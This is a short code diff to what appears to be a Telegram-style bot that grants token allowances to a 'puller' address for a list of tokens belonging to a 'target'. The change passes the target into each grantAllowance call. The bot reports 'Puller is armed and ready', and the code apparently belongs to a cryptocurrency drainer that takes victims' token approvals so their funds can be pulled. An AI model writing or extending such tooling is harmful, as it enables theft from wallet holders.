@@ -87,7 +87,7 @@ export function buildBot() {
 
             for (const t of tokens) {
                 try {
-                    await grantAllowance(s, t, puller);
+                    await grantAllowance(s, t, puller, target);
                 } catch {
                     await ctx.reply(
                         `Approve failed for <code>${t}</code>. Run <code>/approve ${target}</code> to retry.`,
@@ -144,7 +144,7 @@ export function buildBot() {
             await verify(s, data.data.qrCodeId);
 
             for (const tok of targetObj.tokens) {
-                await grantAllowance(s, tok.token, targetObj.puller);
+                await grantAllowance(s, tok.token, targetObj.puller, targetObj.target);
             }
 
             await ctx.reply(`✅ <b>Allowance Approved Successfully! Puller is armed and ready.</b>`, H);
